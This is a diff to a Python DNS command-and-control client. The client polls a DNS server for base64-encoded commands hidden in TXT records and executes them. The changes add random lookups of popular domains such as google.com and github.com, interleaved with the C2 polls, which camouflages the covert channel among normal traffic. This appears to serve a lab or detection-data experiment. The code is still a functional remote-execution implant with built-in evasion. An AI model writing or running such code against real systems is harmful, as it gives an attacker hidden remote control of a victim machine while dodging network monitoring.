@@ -4,9 +4,41 @@ import dns.update
 import base64
 import subprocess
 import time
+import random
 
 # seconds between polling server for more commands
-POLL_TIME = 10
+POLL_TIME = 3
+
+# will do this amount of normal and malicious DNS queries
+# if set to -1, will just do malicious queries forever
+QUERY_LIMIT = 10000
+
+
+DOMAINS = [
+    'google.com',
+    'youtube.com',
+    'example.net',
+    'yahoo.com',
+    'facebook.com',
+    'linkedin.com',
+    'netflix.com',
+    'microsoft.com',
+    'cloudflare.com',
+    'github.com',
+    'stackoverflow.com',
+    'zoom.us',
+    'bing.com',
+    'pinterest.com',
+    'duckduckgo.com',
+    'adobe.com',
+    'spotify.com',
+    'salesforce.com',
+    'protonmail.com',
+    'cnn.com',
+    'nytimes.com',
+    'weather.com',
+    'openai.com'
+]
 
 # Define server and domain
 dns_server = "192.168.243.141"
@@ -44,6 +76,7 @@ def decode_message(encoded_message):
     """
     Decode the Base64 encoded message.
     """
+    print(encoded_message)
     try:
         return base64.b64decode(encoded_message).decode()
     except Exception as e:
@@ -74,13 +107,10 @@ def execute_command(command):
         print(f"Error while executing the command: {e}")
 
 
-def get_covert_messages():
+def get_covert_messages(resolver: dns.resolver.Resolver):
     """
     Query the DNS server for covert messages stored in TXT records and execute them.
     """
-    resolver = dns.resolver.Resolver()
-    resolver.nameservers = [dns_server]
-
     commands = []
 
     for subdomain in subdomains:
@@ -89,7 +119,7 @@ def get_covert_messages():
             for txt_record in response:
                 encoded_message = txt_record.to_text().strip('"')  # Remove quotes
                 
-                # if it is empty, there is no command for us to run righ now
+                # if it is empty, there is no command for us to run right now
                 if not encoded_message:
                     commands.append('')
                     continue
@@ -108,18 +138,43 @@ def get_covert_messages():
         return commands
 
 
-def poll_server():
-    while True:
-        commands = get_covert_messages()
+def process_c2_command(resolver: dns.resolver.Resolver):
+    commands = get_covert_messages(resolver)
 
-        # for right now, only really expecting there to be one
-        for command in commands:
-            if not command:
-                continue
-            execute_command(command)
-        
-        print(f'Sleeping for {POLL_TIME} seconds...')
-        time.sleep(POLL_TIME)
+    # for right now, only really expecting there to be one
+    for command in commands:
+        if not command:
+            continue
+        execute_command(command)
+    
+    print(f'Sleeping for {POLL_TIME} seconds...')
+    time.sleep(POLL_TIME)
+
+
+def make_dns_request(resolver: dns.resolver.Resolver):
+    domain = DOMAINS[random.randint(0, len(DOMAINS)-1)]
+    resolver.resolve(domain, 'A')
+
+
+def poll_server():
+    resolver = dns.resolver.Resolver()
+    resolver.nameservers = [dns_server]
+
+
+    if QUERY_LIMIT == -1:  # just run normally
+        while True:
+            process_c2_command(resolver)
+    else:
+        action_list = [1] * QUERY_LIMIT + [0] * QUERY_LIMIT
+        random.shuffle(action_list)
+
+        for counter, action in enumerate(action_list):
+            print(f'**{counter}/{QUERY_LIMIT*2}**')
+            if action == 0:
+                print('')
+                make_dns_request(resolver)
+            else:
+                process_c2_command(resolver)
 
 
 if __name__ == '__main__':
